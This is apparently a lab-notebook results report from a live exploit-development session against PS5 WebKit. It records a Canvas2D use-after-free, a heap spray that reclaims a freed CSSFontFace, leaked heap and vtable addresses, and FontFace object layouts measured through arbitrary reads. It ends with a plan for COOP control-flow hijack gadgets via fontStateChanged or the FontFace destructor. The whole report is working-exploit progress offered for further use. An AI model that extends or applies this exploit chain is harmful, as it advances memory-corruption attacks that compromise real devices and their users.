# p811-addrof-read Results

Date: 2026-11-12 01:47 UTC
Probe: p811-addrof-read.html (Canvas2D UAF + FontFace forge + layout verify + pointer chases)
Source IP: 192.168.1.37
Log: beacon_logs/beacons_c6d0ed2b-f702-439a-a453-24e0018d8c44.log

## Pipeline

| Field | Value |
|-------|-------|
| Successful try | ~10 (post-patch with b1s sort fix) |
| L1 | 0x10008A1F00 |
| L2 | 0x10009F42A0 |
| Self (spray buffer) | 0x10003880C0 |
| VTAB | 0x1000388D80 |
| BASE | 0x8360E0000 |
| FO (CSSFontFaceClient) | 0x10001640B0 |
| FB (FontFace base) | 0x1000164090 |
| Total syncRead16 | 11 |

## FontFace Object Layout (MEASURED — Grade M)

FB = FO - 0x20 = 0x1000164090

| Offset | Field | Value | Classification | Notes |
|--------|-------|-------|----------------|-------|
| +0x00 | PV (primary vtable) | 0x83D32DAC0 | RODATA | = BASE+0x724DAC0 ✓ pvOK=true |
| +0x08 | ??? | 0x10003518C0 | HEAP | NOT refcount! Likely m_scriptExecutionContext or Ref ptr |
| +0x10 | ??? | 0x0 | NULL | |
| +0x18 | ??? | 0x1 | LOW | Flag/boolean/state |
| +0x20 | VP (secondary vtable) | 0x83D32DB28 | RODATA | = BASE+0x724DB28 ✓ vpOK=true |
| +0x28 | fo08 | 0x10009F42A0 | HEAP | = L2! Weak ptr factory or back-reference |
| +0x30 | **m_backing** | **0x10003880C0** | **HEAP = self** | **CONFIRMED: points to our spray buffer** |
| +0x38 | ??? | 0x10007AAF00 | HEAP | NOT m_loadedPromise (contains string data) |
| +0x40 | may+flags | 0x100000000 | — | Booleans/padding |
| +0x48 | ??? | 0x10008755C0 | HEAP | Object extends beyond 0x48! |

**KEY FINDING: m_backing = self = 0x10003880C0**
The FontFace's Ref<CSSFontFace> points to the freed CSSFontFace slot, which our spray buffer now occupies. We control the CSSFontFace contents.

**LAYOUT CORRECTION: +0x38 is NOT m_loadedPromise**
The pointer at +0x38 (0x10007AAF00) contains ASCII string data "constructor[Symbol.species]" — not a DOMPromiseProxy. The estimated layout was wrong beyond +0x30. m_loadedPromise is at an unknown offset, likely +0x40 or further.

## CSSFontFace Reads (MB Phase — reading spray buffer)

Since mBacking = self, MB reads return our own spray data, not real CSSFontFace fields.

| Read | Offset | q0 | q1 | Notes |
|------|--------|----|----|-------|
| MB1 | +0x00, +0x08 | 0x100380000002 | 0x1000388130 | Spray data, not real vtable |
| MB2 | +0x10, +0x18 | 0x0 | 0x10007F4D90 | |
| MB3 | +0x60, +0x68 | 0x0 | 0x10009F42A0 | |
| MB4 | +0x70, +0x78 | 0x1000000004 | 0x1000388150000E | |
| MB5 | +0x80..+0x8F | all zeros | status@0a=0 | |

## LoadedPromise Chase (LP Phase — reading from +0x38 ptr)

Reading from 0x10007AAF00 (what we THOUGHT was m_loadedPromise):

| Read | Offset | q0 | q1 | ASCII decode |
|------|--------|----|----|-------------|
| LP1 | +0x00, +0x08 | 0x1000810A40 | 0x7463757274736E00 | (heap ptr) + "\0nstruct" |
| LP2 | +0x10, +0x18 | 0x6F626D79535B726F | 0x6569636570732E01 | "or[Symbo" + "\x01.specie" |

**Full string: "\0nstructor[Symbol.specie\x01..."**
This is the JS built-in string "constructor[Symbol.species]". The pointer at FontFace+0x38 points to a WTF::String or JSC string, NOT to DOMPromiseProxyWithResolveCallback.

## m_wrapper Chase (MW Phase — reading spray data)

mWrapper came from CSSFontFace+0x70 (= spray buffer offset 0x70), value 0x1000000004 — bogus.

| Read | q0 | q1 | Notes |
|------|----|----|-------|
| MW1 | 0x10 | 0xD166C000000000 | Garbage — reading from bogus address |

## Self-Scan Bug Fix Applied This Run

Original bug: q7 loop range was 0..0x7E (127 values), missing addresses with byte1 >= 0x7F.
Fix: expanded to full 0..0xFF range, sorted by proximity to byte1 of L2.
Result: self-scan succeeded on try=10 (SELF=0x10003880C0).

**Remaining issue**: 30000 oracle queries causes OOM on PS5 WebKit. Need to reduce budget or optimize.

## Summary of Findings

| Finding | Grade | Impact |
|---------|-------|--------|
| PV at +0x00, VP at +0x20 | M | Layout confirmed |
| m_backing at +0x30 = self (spray) | M | **WE CONTROL CSSFontFace** |
| +0x08 is heap ptr, not refcount | M | Layout diverges from estimate |
| +0x38 is NOT m_loadedPromise | M | Contains string "constructor[Symbol.species]" |
| Object > 0x48 bytes | M | +0x48 has heap ptr |
| Self-scan byte1 bug | M | Fixed (b1s sort) |
| 30K oracle queries → OOM | M | Need reduced budget |

## Implications for COOP Strategy

1. **m_backing = self is exploitable**: We forge the CSSFontFace via our spray buffer. When WebKit calls CSSFontFaceClient methods through the VP, the thunk adjusts this and calls FontFace methods that read fields from the real FontFace (which is alive at FO).

2. **m_loadedPromise offset unknown**: The COOP gadget fontStateChanged reads `this->m_loadedPromise`. Since `this` is the real FontFace, we need to find the actual offset. It's NOT at +0x38. Need a follow-up scan of offsets +0x40 through +0x60.

3. **Alternative: Use destruction gadget PV-0**: `~FontFace()` reads `m_backing->removeClient(*this)`. Since m_backing = our spray, we control what removeClient does. This might be simpler than fontStateChanged.

4. **fo08 = L2 is interesting**: The field at FO+0x08 (FontFace+0x28) equals L2, suggesting it's the CSSFontFace's back-pointer to the ArrayBuffer we used for reclaim (part of the weak ref factory chain).
